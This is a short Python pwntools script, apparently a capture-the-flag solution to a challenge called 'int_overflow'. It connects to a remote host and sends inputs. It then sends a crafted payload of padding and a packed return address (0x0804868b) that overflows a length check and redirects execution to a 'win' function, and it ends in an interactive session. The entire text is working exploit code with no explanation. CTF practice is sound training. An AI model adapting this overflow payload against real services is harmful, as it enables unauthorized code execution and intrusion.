from pwn import *
h,p = '111.200.241.244',62368
p = remote(h,p)
#p = process("./int_overflow")
#gdb.attach("int_overflow")
p.sendline('1')
p.sendline("N4n4")
win = 0x0804868b
exp = "A"*0x14+"B"*4+p32(win)+"A"*(255-0x14-8+5)
p.sendlineafter('wd:',exp)
p.interactive()
